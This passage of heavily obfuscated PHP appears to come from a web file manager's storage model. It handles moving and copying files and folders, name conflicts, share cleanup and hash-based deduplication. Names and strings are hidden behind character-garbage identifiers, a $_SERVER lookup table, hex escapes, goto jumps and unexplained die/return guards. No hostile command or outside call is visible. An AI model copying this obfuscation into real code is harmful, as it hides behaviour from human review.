$İÉßäı[659] => intval(USER_ID), $İÉßäı[660] => intval(USER_ID), $İÉßäı[486] => intval($ü’’íõ[$İÉßäı[203]]), $İÉßäı[661] => $ü’’íõ[$İÉßäı[593]] . $ü’’íõ[$İÉßäı[203]] . $İÉßäı[50], $İÉßäı[507] => $Æê¾ˆŠÁ[$İÉßäı[98]] ? $Æê¾ˆŠÁ[$İÉßäı[98]] : time(), $İÉßäı[513] => 0, $İÉßäı[662] => $İÉßäı[12]); return $Î§ÂÃÏ; } private function _copyApplyMeta($Ü¯ò—Ñä, &$å©í½õÃ) { $ª©±‰®» =& $_SERVER[ÕŸ²ó÷å]; $øßßî‡ƒ = $Ü¯ò—Ñä[$ª©±‰®»[203]]; $ãÜ˜¢è = $Ü¯ò—Ñä[$ª©±‰®»[32]]; if (!isset($Ü¯ò—Ñä[$ª©±‰®»[663]]) || !$Ü¯ò—Ñä[$ª©±‰®»[663]] || $Ü¯ò—Ñä[$ª©±‰®»[663]] == $ª©±‰®»[238]) { $å©í½õÃ[$ª©±‰®»[640]][] = array($ª©±‰®»[203], $øßßî‡ƒ, $ª©±‰®»[663], short_id($øßßî‡ƒ)); } if (Input::check($ãÜ˜¢è, $ª©±‰®»[664])) { $å©í½õÃ[$ª©±‰®»[639]][] = array($ª©±‰®»[203] => $øßßî‡ƒ, $ª©±‰®»[107] => $ª©±‰®»[547], $ª©±‰®»[459] => str_replace($ª©±‰®»[53], $ª©±‰®»[12], Pinyin::get($ãÜ˜¢è))); $å©í½õÃ[$ª©±‰®»[639]][] = array($ª©±‰®»[203] => $øßßî‡ƒ, $ª©±‰®»[107] => $ª©±‰®»[546], $ª©±‰®»[459] => Pinyin::get($ãÜ˜¢è, $ª©±‰®»[665])); } $å©í½õÃ[$ª©±‰®»[639]][] = array($ª©±‰®»[203] => $øßßî‡ƒ, $ª©±‰®»[107] => $ª©±‰®»[526], $ª©±‰®»[459] => KodSort::makeStr($ãÜ˜¢è)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ªÒ‚ıªŠ) { $ÖçºÖû… =& $_SERVER[ÕŸ²ó÷å]; $Üñë¯ú = $this->sourceInfo($ªÒ‚ıªŠ); $Õëè—¼® = $ÖçºÖû…[666]; $²™ßÃëç = array($ÖçºÖû…[593] => array($ÖçºÖû…[621], $Üñë¯ú[$ÖçºÖû…[593]] . $ªÒ‚ıªŠ . $ÖçºÖû…[622]), $ÖçºÖû…[514] => $this->targetIsDelete); $¯²Ò¡î = $this->field($Õëè—¼®)->where($²™ßÃëç)->select(); if (!$¯²Ò¡î) { return; } $¯²Ò¡î = array_to_keyvalue($¯²Ò¡î, $ÖçºÖû…[203]); foreach ($¯²Ò¡î as $õ«Û‚û¤) { $ÇÚÍúşÜ = $õ«Û‚û¤[$ÖçºÖû…[202]]; $ªÒ‚ıªŠ = $õ«Û‚û¤[$ÖçºÖû…[203]]; if (!isset($this->_childrenListCache[$ªÒ‚ıªŠ]) && $õ«Û‚û¤[$ÖçºÖû…[494]] == $ÖçºÖû…[101]) { $this->_childrenListCache[$ªÒ‚ıªŠ] = array(); } if (!isset($this->_childrenListCache[$ÇÚÍúşÜ])) { $this->_childrenListCache[$ÇÚÍúşÜ] = array(); } $this->_childrenListCache[$ÇÚÍúşÜ][$ªÒ‚ıªŠ] = $õ«Û‚û¤; $this->_childrenItemCache[$ªÒ‚ıªŠ] = $õ«Û‚û¤; } } private function _childrenListAll($æ¸ô”úØ, &$ÎÙÖª£­) { $ÂÈ’§ãÃ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->_childrenListCache[$æ¸ô”úØ])) { return; } $ª¼Àš½š = $this->_childrenListCache[$æ¸ô”úØ]; foreach ($ª¼Àš½š as $šÓ‹ô…¬ => $­¤Ç§•) { $ÎÙÖª£­[$šÓ‹ô…¬] = $­¤Ç§•; if ($­¤Ç§•[$ÂÈ’§ãÃ[494]] == $ÂÈ’§ãÃ[101]) { $this->_childrenListAll($šÓ‹ô…¬, $ÎÙÖª£­); } } } private function sourceInfoCache($õïšñÌÍ) { if (isset($this->_childrenItemCache[$õïšñÌÍ])) { return $this->_childrenItemCache[$õïšñÌÍ]; } return $this->sourceInfo($õïšñÌÍ); } private function _childrenList($ğõ­’¤) { if (isset($this->_childrenListCache[$ğõ­’¤])) { return $this->_childrenListCache[$ğõ­’¤]; } return $this->_childrenListSelect($ğõ­’¤); } private function _childrenListSelect($õÄ§š„İ) { $Ğü²‡« =& $_SERVER[ÕŸ²ó÷å]; $»ÇûÜñÁ = array($Ğü²‡«[202] => $õÄ§š„İ, $Ğü²‡«[514] => $this->targetIsDelete); $Ö¸èÃûØ = $this->where($»ÇûÜñÁ)->select(); $Ö¸èÃûØ = $Ö¸èÃûØ ? $Ö¸èÃûØ : array(); $íï¨ƒÁã = array_to_keyvalue($Ö¸èÃûØ, $Ğü²‡«[203]); $this->_childrenListCache[$õÄ§š„İ] = $íï¨ƒÁã; foreach ($íï¨ƒÁã as $õÄ§š„İ => $åÔ‹Óæ˜) { $this->_childrenItemCache[$õÄ§š„İ] = $åÔ‹Óæ˜; } return $íï¨ƒÁã; } private function fileNameExistAuto($×í±»¿â, $ı¸™·İ¢) { $ñ®Ğ–  =& $_SERVER[ÕŸ²ó÷å]; if ($ı¸™·İ¢[$ñ®Ğ– [514]] == $ñ®Ğ– [101]) { return $this->fileNameExist($×í±»¿â, $ı¸™·İ¢[$ñ®Ğ– [32]]); } return $this->fileNameExistCache($×í±»¿â, $ı¸™·İ¢[$ñ®Ğ– [32]]); } private function fileNameExistCache($Û¥ÑÚÅÆ, $İÍ±÷ĞÙ) { $ù¨ÄÂ«ğ =& $_SERVER[ÕŸ²ó÷å]; $İÍ±÷ĞÙ = strtolower($İÍ±÷ĞÙ); $ÖçÑíæ÷ = $this->_childrenList($Û¥ÑÚÅÆ); foreach ($ÖçÑíæ÷ as $•ÕÖ†ç‚) { if ($İÍ±÷ĞÙ == strtolower($•ÕÖ†ç‚[$ù¨ÄÂ«ğ[32]])) { return $•ÕÖ†ç‚[$ù¨ÄÂ«ğ[203]]; } } return !1; } private function fileNameAutoCache($Ëá¹Ü, $Ç İğŠ, $ëÂ±Ô©ş, $šµ­§œ) { $¼ÒÊ¬º” =& $_SERVER[ÕŸ²ó÷å]; $é©´ğÆ = $this->_childrenList($Ëá¹Ü); $”„ÍÛ‘ì = array_to_keyvalue($é©´ğÆ, $¼ÒÊ¬º”[12], $¼ÒÊ¬º”[32]); return $this->fileNameAutoGet($”„ÍÛ‘ì, $Ç İğŠ, $ëÂ±Ô©ş, $šµ­§œ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‚¾·öæÛ, $»á™Î, $œØ¯òè = REPEAT_REPLACE, $à¡î¨‘Ù = '') { $±¯ê´æ =& $_SERVER[ÕŸ²ó÷å]; $‡—„˜¯Ù = $this->sourceInfo($‚¾·öæÛ); $ÛïÓá¥© = $this->sourceInfo($»á™Î); if ($‡—„˜¯Ù[$±¯ê´æ[202]] == $ÛïÓá¥©[$±¯ê´æ[203]]) { if ($‡—„˜¯Ù[$±¯ê´æ[514]] == $±¯ê´æ[101]) { Model($±¯ê´æ[512])->restore(array($‚¾·öæÛ)); } if (!$à¡î¨‘Ù || $à¡î¨‘Ù == $‡—„˜¯Ù[$±¯ê´æ[32]]) { return $‚¾·öæÛ; } } $€º…µŞ´ = $this->pathInfoMore($‚¾·öæÛ); if ($this->isParentOf($‚¾·öæÛ, $»á™Î)) { return !1; } if (!$‡—„˜¯Ù || !$ÛïÓá¥© || $ÛïÓá¥©[$±¯ê´æ[494]] != $±¯ê´æ[101]) { return !1; } Hook::trigger($±¯ê´æ[667], $€º…µŞ´); $this->targetIsDelete = intval($‡—„˜¯Ù[$±¯ê´æ[514]]); if ($‡—„˜¯Ù[$±¯ê´æ[202]] == $»á™Î && $à¡î¨‘Ù != $‡—„˜¯Ù[$±¯ê´æ[32]]) { $üÛÉï€ = $this->fileNameExist($»á™Î, $à¡î¨‘Ù); if ($üÛÉï€ && $‡—„˜¯Ù[$±¯ê´æ[494]] == $±¯ê´æ[238]) { $È„´àÛû = $this->sourceInfo($üÛÉï€); $ ƒÔ‰–‘ = $this->fileHistory($È„´àÛû, $‡—„˜¯Ù[$±¯ê´æ[550]], $‡—„˜¯Ù[$±¯ê´æ[89]]); if (!$ ƒÔ‰–‘) { Model($±¯ê´æ[553])->remove($‡—„˜¯Ù[$±¯ê´æ[550]]); } $this->removeNow($‚¾·öæÛ, !1); $this->folderSizeReset($»á™Î); Hook::trigger($±¯ê´æ[668], $€º…µŞ´); return $üÛÉï€; } } $¸¼Ñ· = $à¡î¨‘Ù ? $à¡î¨‘Ù : $‡—„˜¯Ù[$±¯ê´æ[32]]; $this->lockMoveStart($‚¾·öæÛ); $this->lockWriteStart($»á™Î, $¸¼Ñ·); $úÚ¥²Ş‡ = array($±¯ê´æ[638] => array(), $±¯ê´æ[669] => !1); $this->clearShare($‚¾·öæÛ, $»á™Î); $ŸÃß‚ğÇ = $this->fileNameExistAuto($»á™Î, $‡—„˜¯Ù); $ØÏÂ«¬å = $this->_move($‚¾·öæÛ, $»á™Î, $œØ¯òè, $úÚ¥²Ş‡, $à¡î¨‘Ù); $this->sourceCacheClear(); if ($‡—„˜¯Ù[$±¯ê´æ[494]] == $±¯ê´æ[101] && $ŸÃß‚ğÇ) { $this->folderSizeResetChildren($ØÏÂ«¬å); } Model($±¯ê´æ[240])->linkAdd($úÚ¥²Ş‡[$±¯ê´æ[638]]); if ($ŸÃß‚ğÇ && $úÚ¥²Ş‡[$±¯ê´æ[669]]) { $this->removeNow($‚¾·öæÛ, !1); } $this->lockMoveEnd($‚¾·öæÛ); $this->lockWriteEnd($»á™Î, $¸¼Ñ·); $this->folderSizeReset($‡—„˜¯Ù[$±¯ê´æ[202]]); $this->folderSizeReset($»á™Î); $§ÃË® = array($‡—„˜¯Ù[$±¯ê´æ[202]], $»á™Î); if ($‡—„˜¯Ù[$±¯ê´æ[494]] == $±¯ê´æ[101]) { $§ÃË®[] = $‚¾·öæÛ; } $this->updateModifyTime($§ÃË®); Model($±¯ê´æ[642])->eventMove($‚¾·öæÛ, $‡—„˜¯Ù[$±¯ê´æ[202]], $»á™Î); Hook::trigger($±¯ê´æ[668], $€º…µŞ´); return $ØÏÂ«¬å; } private function _move($¨Ä½Ó, $æ•³ãâ, $š¤—Ñõ­, &$”Ì‚÷èß, $Ò¢½¥Ï = '') { $•èÄ·Óæ =& $_SERVER[ÕŸ²ó÷å]; $€Ï‰± = $this->sourceInfo($¨Ä½Ó); $€¨œ—áÂ = $€Ï‰±[$•èÄ·Óæ[494]] == $•èÄ·Óæ[101]; $¿İŸ¯ğ = $Ò¢½¥Ï ? $Ò¢½¥Ï : $€Ï‰±[$•èÄ·Óæ[32]]; $Ì¦ ä¢× = $this->fileNameExistAuto($æ•³ãâ, $€Ï‰±); $this->lockMoveStart($¨Ä½Ó); $this->lockWriteStart($æ•³ãâ, $¿İŸ¯ğ); if (!$Ì¦ ä¢×) { return $this->_moveForce($¨Ä½Ó, $æ•³ãâ, $¿İŸ¯ğ); } $¦®‚ÊŞù = $Ì¦ ä¢×; $«÷ùÊš® = !1; if ($€¨œ—áÂ) { if ($š¤—Ñõ­ == REPEAT_RENAME_FOLDER) { $¿İŸ¯ğ = $this->fileNameAuto($æ•³ãâ, $¿İŸ¯ğ, $š¤—Ñõ­, $€¨œ—áÂ); $¦®‚ÊŞù = $this->_moveForce($¨Ä½Ó, $æ•³ãâ, $¿İŸ¯ğ); } else { if ($š¤—Ñõ­ == REPEAT_RENAME_FOLDER) { $š¤—Ñõ­ = REPEAT_RENAME; } $ş­çÁõ = $this->_childrenListSelect($¨Ä½Ó); foreach ($ş­çÁõ as $»Ë»ŞàÌ) { $this->_move($»Ë»ŞàÌ[$•èÄ·Óæ[203]], $Ì¦ ä¢×, $š¤—Ñõ­, $”Ì‚÷èß); } $«÷ùÊš® = !0; } } else { if ($š¤—Ñõ­ == REPEAT_SKIP) { $«÷ùÊš® = !0; } else { if ($š¤—Ñõ­ == REPEAT_RENAME || $š¤—Ñõ­ == REPEAT_RENAME_FOLDER) { $¿İŸ¯ğ = $this->fileNameAuto($æ•³ãâ, $¿İŸ¯ğ, $š¤—Ñõ­, $€¨œ—áÂ); $¦®‚ÊŞù = $this->_moveForce($¨Ä½Ó, $æ•³ãâ, $¿İŸ¯ğ); } else { if ($š¤—Ñõ­ == REPEAT_REPLACE) { $ÁÊİ™» = $this->sourceInfoCache($Ì¦ ä¢×); $Ü…ˆèßø = $this->fileHistory($ÁÊİ™», $€Ï‰±[$•èÄ·Óæ[550]], $€Ï‰±[$•èÄ·Óæ[89]]); $«÷ùÊš® = !0; if ($Ü…ˆèßø) { $”Ì‚÷èß[$•èÄ·Óæ[638]][] = $€Ï‰±[$•èÄ·Óæ[550]]; } } } } } if ($«÷ùÊš® && !$”Ì‚÷èß[$•èÄ·Óæ[669]]) { $”Ì‚÷èß[$•èÄ·Óæ[669]] = !0; } return $¦®‚ÊŞù; } private function _moveForce($ø³åûÅ’, $ÕÅô¤˜á, $šùï¿ÑÔ) { $áá‹Ôó’ =& $_SERVER[ÕŸ²ó÷å]; $í´ëÂÁè = $this->sourceInfo($ø³åûÅ’); $Ôœ¹²é‹ = $this->sourceInfo($ÕÅô¤˜á); $Ê¥Ö§ÍÈ = $í´ëÂÁè[$áá‹Ôó’[494]] == $áá‹Ôó’[101]; $ìõÇ¦Ÿ» = array($áá‹Ôó’[486] => $Ôœ¹²é‹[$áá‹Ôó’[203]], $áá‹Ôó’[661] => $Ôœ¹²é‹[$áá‹Ôó’[593]] . $Ôœ¹²é‹[$áá‹Ôó’[203]] . $áá‹Ôó’[50], $áá‹Ôó’[657] => $Ôœ¹²é‹[$áá‹Ôó’[200]], $áá‹Ôó’[658] => $Ôœ¹²é‹[$áá‹Ôó’[578]], $áá‹Ôó’[660] => USER_ID, $áá‹Ôó’[503] => $šùï¿ÑÔ); $Ù¤éÕûù = $í´ëÂÁè[$áá‹Ôó’[200]] == SourceModel::TYPE_GROUP && $Ôœ¹²é‹[$áá‹Ôó’[200]] == SourceModel::TYPE_GROUP && $í´ëÂÁè[$áá‹Ôó’[578]] == $Ôœ¹²é‹[$áá‹Ôó’[578]]; if (!$Ù¤éÕûù && $this->moveClearAuth) { Model($áá‹Ôó’[576])->authClear($ø³åûÅ’); } $Ã³«û‰ = $í´ëÂÁè[$áá‹Ôó’[514]] == $áá‹Ôó’[101] && $Ôœ¹²é‹[$áá‹Ôó’[514]] != $áá‹Ôó’[101]; if ($Ã³«û‰) { $ìõÇ¦Ÿ»[$áá‹Ôó’[513]] = 0; } if ($Ê¥Ö§ÍÈ) { $²à¡¹ÄÈ = array($áá‹Ôó’[661] => array($áá‹Ôó’[621], $í´ëÂÁè[$áá‹Ôó’[593]] . $í´ëÂÁè[$áá‹Ôó’[203]] . $áá‹Ôó’[622])); $şºĞ–’ = $í´ëÂÁè[$áá‹Ôó’[593]] . $í´ëÂÁè[$áá‹Ôó’[203]] . $áá‹Ôó’[50]; $šÑ› ¦Å = $Ôœ¹²é‹[$áá‹Ôó’[593]] . $Ôœ¹²é‹[$áá‹Ôó’[203]] . $áá‹Ôó’[50] . $í´ëÂÁè[$áá‹Ôó’[203]] . $áá‹Ôó’[50]; $İ¸‡ğš® = array($áá‹Ôó’[661] => array($áá‹Ôó’[670], "\162\x65\x70\154\141\x63\145\50\x70\141\162\145\156\x74\x4c\145\x76\x65\154\54\x27{$şºĞ–’}\x27\x2c\x27{$šÑ› ¦Å}\x27\51"), $áá‹Ôó’[657] => $Ôœ¹²é‹[$áá‹Ôó’[200]], $áá‹Ôó’[658] => $Ôœ¹²é‹[$áá‹Ôó’[578]]); if ($Ã³«û‰) { $İ¸‡ğš®[$áá‹Ôó’[513]] = 0; } $this->where($²à¡¹ÄÈ)->data($İ¸‡ğš®)->save(); } $this->where(array($áá‹Ôó’[500] => $ø³åûÅ’))->data($ìõÇ¦Ÿ»)->save(); return $ø³åûÅ’; } private function clearShare($¡…óıú, $óÉÒ«Á) { $à•øÛ‰« =& $_SERVER[ÕŸ²ó÷å]; $¼ÇŞºò = $this->sourceInfo($¡…óıú); $¸Â¾ã”ı = $this->sourceInfo($óÉÒ«Á); if ($¼ÇŞºò[$à•øÛ‰«[578]] == $¸Â¾ã”ı[$à•øÛ‰«[578]] && $¼ÇŞºò[$à•øÛ‰«[200]] == $à•øÛ‰«[671]) { return; } $ıÏ˜à¡Ó = array($à•øÛ‰«[593] => array($à•øÛ‰«[621], $¼ÇŞºò[$à•øÛ‰«[593]] . $¡…óıú . $à•øÛ‰«[622])); $Õ£³è¦ = $this->field($à•øÛ‰«[500])->where($ıÏ˜à¡Ó)->getField($à•øÛ‰«[203], !0); if (!$Õ£³è¦) { return; } $ıÏ˜à¡Ó = array($à•øÛ‰«[203] => array($à•øÛ‰«[7], $Õ£³è¦), $à•øÛ‰«[672] => 1); $Œ÷µÍ¶š = Model($à•øÛ‰«[673])->field($à•øÛ‰«[674])->where($ıÏ˜à¡Ó)->select(); if (!$Œ÷µÍ¶š) { return; } $Œ÷µÍ¶š = array_to_keyvalue($Œ÷µÍ¶š, $à•øÛ‰«[12], $à•øÛ‰«[674]); $ıÏ˜à¡Ó = array($à•øÛ‰«[674] => array($à•øÛ‰«[7], $Œ÷µÍ¶š)); Model($à•øÛ‰«[673])->where($ıÏ˜à¡Ó)->save(array($à•øÛ‰«[672] => 0)); Model($à•øÛ‰«[675])->where($ıÏ˜à¡Ó)->delete(); } public function copyFolderFromIO($·Ÿ§Ÿùñ, $††í¤Ù, $†‡È‚ı˜, $Ã¥‡‘ÚÅ, $“õòÊßü, $¼ÉŸ« ” = false) { $ë€Æ­Ã =& $_SERVER[ÕŸ²ó÷å]; $›ºĞÅ§÷ = array($ë€Æ­Ã[639] => array(), $ë€Æ­Ã[640] => array(), $ë€Æ­Ã[638] => array(), $ë€Æ­Ã[676] => array()); $Šş‰Ÿì¿ = $¼ÉŸ« ” ? $¼ÉŸ« ” : $·Ÿ§Ÿùñ->pathThis($††í¤Ù); $Šº‰àÄ = $this->fileNameExist($†‡È‚ı˜, $Šş‰Ÿì¿); $³ œÙ‹­ = $this->mkdir($†‡È‚ı˜, $Šş‰Ÿì¿, $Ã¥‡‘ÚÅ); if (!$Šº‰àÄ || $Ã¥‡‘ÚÅ == REPEAT_RENAME_FOLDER) { $Ã¥‡‘ÚÅ = !1; } if ($Šº‰àÄ) { $this->_childrenAllMake($Šº‰àÄ); } Hook::trigger($ë€Æ­Ã[677]); $this->_copyChildTo($·Ÿ§Ÿùñ, $††í¤Ù, $³ œÙ‹­, $Ã¥‡‘ÚÅ, $›ºĞÅ§÷, $“õòÊßü); Hook::trigger($ë€Æ­Ã[678]); if ($³ œÙ‹­) { $this->folderSizeResetChildren($³ œÙ‹­); } $this->_childrenListClear(); Model($ë€Æ­Ã[641])->addAll($›ºĞÅ§÷[$ë€Æ­Ã[639]], array(), !0); Model($ë€Æ­Ã[642])->eventCopy($³ œÙ‹­); $this->saveAll($›ºĞÅ§÷[$ë€Æ­Ã[640]]); Model($ë€Æ­Ã[553])->linkAdd($›ºĞÅ§÷[$ë€Æ­Ã[638]]); Model($ë€Æ­Ã[553])->remove($›ºĞÅ§÷[$ë€Æ­Ã[676]]); $this->folderSizeReset($†‡È‚ı˜); $this->updateModifyTime($†‡È‚ı˜); return $³ œÙ‹­; } private function _copyChildTo($ğã°¡¾Ã, $»‚ìÕÊ, $±Êñ€Üî, $¹ŒùÅ·, &$Ú¡ÈÈ‘, $‹æ³¿õø) { $ÂèÇ¾¦¸ =& $_SERVER[ÕŸ²ó÷å]; $ş†‚÷Ïş = $this->sourceInfoCache($±Êñ€Üî); $ü•ñ ¥™ = $ğã°¡¾Ã->listPath($»‚ìÕÊ); $ü•ñ ¥™ = $ü•ñ ¥™ ? $ü•ñ ¥™ : array($ÂèÇ¾¦¸[96] => array(), $ÂèÇ¾¦¸[95] => array()); $¾º½¥…Ê = array_merge($ü•ñ ¥™[$ÂèÇ¾¦¸[96]], $ü•ñ ¥™[$ÂèÇ¾¦¸[95]]); $ÊôÅ‹µó = $this->_addFiles($ğã°¡¾Ã, $ü•ñ ¥™[$ÂèÇ¾¦¸[96]], $‹æ³¿õø); $¸öóÎ¯é = array(); foreach ($¾º½¥…Ê as &$š·¯Äü) { if (isset($ÊôÅ‹µó[$š·¯Äü[$ÂèÇ¾¦¸[32]]])) { $š·¯Äü = $ÊôÅ‹µó[$š·¯Äü[$ÂèÇ¾¦¸[32]]]; } $š·¯Äü[$ÂèÇ¾¦¸[494]] = $š·¯Äü[$ÂèÇ¾¦¸[33]] == $ÂèÇ¾¦¸[88]; $š·¯Äü[$ÂèÇ¾¦¸[495]] = substr(_get($š·¯Äü, $ÂèÇ¾¦¸[179], $ÂèÇ¾¦¸[12]), 0, 10); $š·¯Äü[$ÂèÇ¾¦¸[89]] = _get($š·¯Äü, $ÂèÇ¾¦¸[89], 0); $š·¯Äü[$ÂèÇ¾¦¸[550]] = _get($š·¯Äü, $ÂèÇ¾¦¸[550], 0); if (!isset($š·¯Äü[$ÂèÇ¾¦¸[679]]) && $š·¯Äü[$ÂèÇ¾¦¸[550]]) { $Ú¡ÈÈ‘[$ÂèÇ¾¦¸[676]][] = $š·¯Äü[$ÂèÇ¾¦¸[550]]; } if ($¹ŒùÅ·) { $†¾½İÃ¤ = $this->fileNameExistCache($±Êñ€Üî, $š·¯Äü[$ÂèÇ¾¦¸[32]]); if ($†¾½İÃ¤) { if ($š·¯Äü[$ÂèÇ¾¦¸[494]] || $¹ŒùÅ· == REPEAT_SKIP) { continue; } if ($¹ŒùÅ· == REPEAT_REPLACE) { $“‹¢å—‹ = $this->sourceInfoCache($†¾½İÃ¤); $‹£Ÿ¯û = $this->fileHistory($“‹¢å—‹, $š·¯Äü[$ÂèÇ¾¦¸[550]], $š·¯Äü[$ÂèÇ¾¦¸[89]]); if ($‹£Ÿ¯û) { $Ú¡ÈÈ‘[$ÂèÇ¾¦¸[638]][] = $š·¯Äü[$ÂèÇ¾¦¸[550]]; } continue; } else { if ($¹ŒùÅ· == REPEAT_RENAME) { $š·¯Äü[$ÂèÇ¾¦¸[32]] = $this->fileNameAutoCache($±Êñ€Üî, $š·¯Äü[$ÂèÇ¾¦¸[32]], $¹ŒùÅ·, !1); } } } } if (!$š·¯Äü[$ÂèÇ¾¦¸[494]] && $š·¯Äü[$ÂèÇ¾¦¸[550]] == 0) { continue; } if (!$š·¯Äü[$ÂèÇ¾¦¸[494]] && $š·¯Äü[$ÂèÇ¾¦¸[550]]) { $Ú¡ÈÈ‘[$ÂèÇ¾¦¸[638]][] = $š·¯Äü[$ÂèÇ¾¦¸[550]]; } $¸öóÎ¯é[] = $this->_makeItemData($š·¯Äü, $ş†‚÷Ïş, $š·¯Äü[$ÂèÇ¾¦¸[32]]); } unset($š·¯Äü); if (!empty($¸öóÎ¯é)) { $this->addAll($¸öóÎ¯é); $this->_childrenListSelect($±Êñ€Üî); } $µ”¹ƒĞÈ = $this->_childrenList($±Êñ€Üî); $µ”¹ƒĞÈ = array_to_keyvalue($µ”¹ƒĞÈ, $ÂèÇ¾¦¸[32]); foreach ($¾º½¥…Ê as $š·¯Äü) { $“‹¢å—‹ = $µ”¹ƒĞÈ[$š·¯Äü[$ÂèÇ¾¦¸[32]]]; $œØ¬Ô = $“‹¢å—‹[$ÂèÇ¾¦¸[203]]; $this->_copyApplyMeta($“‹¢å—‹, $Ú¡ÈÈ‘); if ($š·¯Äü[$ÂèÇ¾¦¸[33]] == $ÂèÇ¾¦¸[88]) { $š·¯Äü[$ÂèÇ¾¦¸[97]] = $ğã°¡¾Ã->getPathInner($š·¯Äü[$ÂèÇ¾¦¸[97]]); $this->_copyChildTo($ğã°¡¾Ã, $š·¯Äü[$ÂèÇ¾¦¸[97]], $œØ¬Ô, $¹ŒùÅ·, $Ú¡ÈÈ‘, $‹æ³¿õø); } } } private function _addFiles($÷°Ş«¢¨, $ê›‡¡„, $ùÄ‹™¥ä) { $ïÊ–††ö =& $_SERVER[ÕŸ²ó÷å]; if (!$ê›‡¡„ || count($ê›‡¡„) == 0) { return array(); } $åå°° = array(); foreach ($ê›‡¡„ as &$Ù°¿Ğ©Ø) { Hook::trigger($ïÊ–††ö[680], $Ù°¿Ğ©Ø); $Ù°¿Ğ©Ø[$ïÊ–††ö[97]] = $÷°Ş«¢¨->getPathInner($Ù°¿Ğ©Ø[$ïÊ–††ö[97]]); $ìŠÕòÖ¾ = $÷°Ş«¢¨->hashSimple($Ù°¿Ğ©Ø[$ïÊ–††ö[97]]); $ÎîäŠ¥‹ = $÷°Ş«¢¨->hashMd5($Ù°¿Ğ©Ø[$ïÊ–††ö[97]]); if (strlen($ÎîäŠ¥‹) > 10 && !isset($åå°°[$ÎîäŠ¥‹])) { $åå°°[$ÎîäŠ¥‹] = array(); } $Ù°¿Ğ©Ø[$ïÊ–††ö[681]] = $ìŠÕòÖ¾; $Ù°¿Ğ©Ø[$ïÊ–††ö[556]] = $ÎîäŠ¥‹; $åå°°[$ÎîäŠ¥‹][] =& $Ù°¿Ğ©Ø; if (count($åå°°[$ÎîäŠ¥‹]) > 1) { $Ù°¿Ğ©Ø[$ïÊ–††ö[679]] = !0; } Hook::trigger($ïÊ–††ö[682], $Ù°¿Ğ©Ø); } unset($Ù°¿Ğ©Ø); $êÄ”…û´ = array($ïÊ–††ö[556] => array($ïÊ–††ö[7], array_keys($åå°°))); $ãËİû© = Model($ïÊ–††ö[683]); $±ÌÊèŒ§ = $ãËİû©->where($êÄ”…û´)->select(); $±ÌÊèŒ§ = $±ÌÊèŒ§ ? $±ÌÊèŒ§ : array(); foreach ($±ÌÊèŒ§ as $ëƒÚëÀ¼) { if (!isset($åå°°[$ëƒÚëÀ¼[$ïÊ–††ö[556]]])) { continue; } $Œå ã›– = $åå°°[$ëƒÚëÀ¼[$ïÊ–††ö[556]]]; foreach ($Œå ã›– as &$Ù°¿Ğ©Ø) { $Ù°¿Ğ©Ø[$ïÊ–††ö[550]] = $ëƒÚëÀ¼[$ïÊ–††ö[550]]; $Ù°¿Ğ©Ø[$ïÊ–††ö[679]] = !0; } unset($Ù°¿Ğ©Ø); } $½Ä¹Âœñ = array(); foreach ($ê›‡¡„ as $½İÜò†Ñ) { Hook::trigger($ïÊ–††ö[684], $½İÜò†Ñ); if (isset($½İÜò†Ñ[$ïÊ–††ö[679]]) && $½İÜò†Ñ[$ïÊ–††ö[679]]) { Hook::trigger($ïÊ–††ö[685], $½İÜò†Ñ); continue; } $¶ğºÅÂÔ = $÷°Ş«¢¨->getPathInner($½İÜò†Ñ[$ïÊ–††ö[97]]); $ãÃÈ‰¦Ÿ = $ãËİû©->addFileMake($¶ğºÅÂÔ, $½İÜò†Ñ[$ïÊ–††ö[89]], $½İÜò†Ñ[$ïÊ–††ö[681]], $½İÜò†Ñ[$ïÊ–††ö[556]], $½İÜò†Ñ[$ïÊ–††ö[32]], $ùÄ‹™¥ä); Hook::trigger($ïÊ–††ö[685], $½İÜò†Ñ); if (!is_array($ãÃÈ‰¦Ÿ)) { continue; } $½Ä¹Âœñ[] = $ãÃÈ‰¦Ÿ; } $ãËİû©->addAll($½Ä¹Âœñ); $êÄ”…û´ = array($ïÊ–††ö[556] => array($ïÊ–††ö[7], array_keys($åå°°))); $±ÌÊèŒ§ = $ãËİû©->where($êÄ”…û´)->select(); $±ÌÊèŒ§ = $±ÌÊèŒ§ ? $±ÌÊèŒ§ : array(); foreach ($±ÌÊèŒ§ as $ëƒÚëÀ¼) { if (!isset($åå°°[$ëƒÚëÀ¼[$ïÊ–††ö[556]]])) { continue; } $ğƒĞ¡›Ÿ =& $åå°°[$ëƒÚëÀ¼[$ïÊ–††ö[556]]]; foreach ($ğƒĞ¡›Ÿ as &$Ù°¿Ğ©Ø) { $Ù°¿Ğ©Ø[$ïÊ–††ö[550]] = $ëƒÚëÀ¼[$ïÊ–††ö[550]]; } unset($Ù°¿Ğ©Ø); } $ìıç°¿ = array(); foreach ($ê›‡¡„ as $ßÃÜĞŒ£) { $ìıç°¿[$ßÃÜĞŒ£[$ïÊ–††ö[32]]] = $ßÃÜĞŒ£; } return $ìıç°¿; } } define($_SERVER[ÕŸ²ó÷å][686], $_SERVER[ÕŸ²ó÷å][687]); goto Dã¿Î¾Í±¥; fµŞ•¯‘Ó»: if (!$gwjiunoxme) { return; } class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($°­×è‹) { $Ü±øÀëó =& $_SERVER[ÕŸ²ó÷å]; $·£¸¢ô =& $_SERVER[¢¿ãÄÁ¤]; $ÔÈâ‡®ò = explode($·£¸¢ô[0], trim($°­×è‹, $·£¸¢ô[0])); $this->defaultModule = $ÔÈâ‡®ò[0] ? $ÔÈâ‡®ò[0] : $this->defaultModule; $Áºåø’ = $Ü±øÀëó[692]; if (strlen($Áºåø’) < $Ü±øÀëó[693]) { return; } $this->defaultController = $ÔÈâ‡®ò[1] ? $ÔÈâ‡®ò[1] : $this->defaultController; $ùú†Ó¢ = $Ü±øÀëó[694]; $this->defaultAction = $ÔÈâ‡®ò[2] ? $ÔÈâ‡®ò[2] : $this->defaultAction; $•İĞÖÊ = $Ü±øÀëó[695]; if (!$•İĞÖÊ) { die; } $this->zkhv58c797ca($·£¸¢ô[1], array($this, $·£¸¢ô[2])); $Ù›µŞÂ = $Ü±øÀëó[696]; if 